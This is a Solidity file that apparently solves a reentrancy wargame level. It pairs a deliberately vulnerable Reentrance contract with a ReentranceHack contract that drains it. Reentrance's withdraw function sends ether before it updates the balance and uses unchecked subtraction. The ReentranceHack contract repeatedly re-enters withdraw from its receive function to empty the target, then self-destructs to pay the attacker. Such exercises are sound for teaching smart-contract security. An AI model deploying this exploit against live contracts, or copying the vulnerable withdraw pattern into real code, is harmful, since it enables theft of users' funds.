// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/Math.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceHack {

  Reentrance private reentrance;

  constructor(address payable _reentrance) public {
    reentrance = Reentrance(_reentrance);
  }

  function attack() public payable {
    reentrance.donate{value: msg.value}(address(this));
    reentrance.withdraw(msg.value);

    selfdestruct(payable(msg.sender));
  }

  receive() external payable {
    uint256 balance = Math.min(address(reentrance).balance, msg.value);
    if ( balance > 0 ) {
      reentrance.withdraw(balance);
    }
  }
}